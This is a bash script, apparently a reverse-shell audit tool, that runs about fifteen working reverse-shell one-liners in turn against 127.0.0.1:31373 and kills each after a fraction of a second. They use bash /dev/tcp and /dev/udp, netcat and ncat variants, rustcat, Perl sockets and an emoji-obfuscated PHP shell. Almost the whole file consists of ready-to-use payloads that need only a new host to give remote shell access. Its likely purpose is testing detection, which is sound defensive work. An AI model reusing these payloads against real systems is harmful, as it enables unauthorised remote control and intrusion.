#!/bin/bash
HOST=/dev/tcp/127.0.0.1/31373
echo "[i] Starting Reverse Shell Audit" > $HOST
echo "[i] Attempting Bash -i"
echo "[i] Attempting Bash -i" > $HOST
echo ">> sh -i >& /dev/tcp/127.0.0.1/31373 0>&1"
sleep 0.01
set -m; (bash -c 'sh -i >& /dev/tcp/127.0.0.1/31373 0>&1') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting Bash 196"
echo "[i] Attempting Bash 196" > $HOST
echo ">> 0<&196;exec 196<>/dev/tcp/127.0.0.1/31373; sh <&196 >&196 2>&196"
sleep 0.01
set -m; (bash -c '0<&196;exec 196<>/dev/tcp/127.0.0.1/31373; sh <&196 >&196 2>&196') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting Bash read line"
echo "[i] Attempting Bash read line" > $HOST
echo ">> exec 5<>/dev/tcp/127.0.0.1/31373;cat <&5 | while read line; do $line 2>&5 >&5; done"
sleep 0.01
set -m; (bash -c 'exec 5<>/dev/tcp/127.0.0.1/31373;cat <&5 | while read line; do $line 2>&5 >&5; done') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting Bash 5"
echo "[i] Attempting Bash 5" > $HOST
echo ">> sh -i 5<> /dev/tcp/127.0.0.1/31373 0<&5 1>&5 2>&5"
sleep 0.01
set -m; (bash -c 'sh -i 5<> /dev/tcp/127.0.0.1/31373 0<&5 1>&5 2>&5') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting Bash udp"
echo "[i] Attempting Bash udp" > $HOST
echo ">> sh -i >& /dev/udp/127.0.0.1/31373 0>&1"
sleep 0.01
set -m; (bash -c 'sh -i >& /dev/udp/127.0.0.1/31373 0>&1') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting nc mkfifo"
echo "[i] Attempting nc mkfifo" > $HOST
echo ">> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 31373 >/tmp/f"
sleep 0.01
set -m; (bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 31373 >/tmp/f') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting nc -e"
echo "[i] Attempting nc -e" > $HOST
echo ">> nc -e sh 127.0.0.1 31373"
sleep 0.01
set -m; (bash -c 'nc -e sh 127.0.0.1 31373') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting nc -c"
echo "[i] Attempting nc -c" > $HOST
echo ">> nc -c sh 127.0.0.1 31373"
sleep 0.01
set -m; (bash -c 'nc -c sh 127.0.0.1 31373') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting ncat -e"
echo "[i] Attempting ncat -e" > $HOST
echo ">> ncat 127.0.0.1 31373 -e sh"
sleep 0.01
set -m; (bash -c 'ncat 127.0.0.1 31373 -e sh') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting ncat udp"
echo "[i] Attempting ncat udp" > $HOST
echo ">> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 127.0.0.1 31373 >/tmp/f"
sleep 0.01
set -m; (bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 127.0.0.1 31373 >/tmp/f') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting rustcat"
echo "[i] Attempting rustcat" > $HOST
echo ">> rcat 127.0.0.1 31373 -r sh"
sleep 0.01
set -m; (bash -c 'rcat 127.0.0.1 31373 -r sh') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting Perl"
echo "[i] Attempting Perl" > $HOST
echo ">> perl -e 'use Socket;$i="127.0.0.1";$p=31373;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'"
sleep 0.01
set -m; (bash -c 'perl -e '"'"'use Socket;$i="127.0.0.1";$p=31373;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'"'"'') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting Perl no sh"
echo "[i] Attempting Perl no sh" > $HOST
echo ">> perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:31373");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
sleep 0.01
set -m; (bash -c 'perl -MIO -e '"'"'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:31373");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"'"'') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Attempting PHP Emoji"
echo "[i] Attempting PHP Emoji" > $HOST
echo ">> php -r '$😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";$🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";$🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";$😘="n";$😗="o";$😙="p";$🤗="s";$😑="x";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = "127.0.0.1";$💻 = 31373;$🐚 = "sh". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'"
sleep 0.01
set -m; (bash -c 'php -r '"'"'$😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";$🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";$🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";$😘="n";$😗="o";$😙="p";$🤗="s";$😑="x";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = "127.0.0.1";$💻 = 31373;$🐚 = "sh". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'"'"'') & set +m; PID="$!"
sleep 0.2
kill -9 -- -"$PID"
echo "[i] Ending Reverse Shell Audit" > $HOST
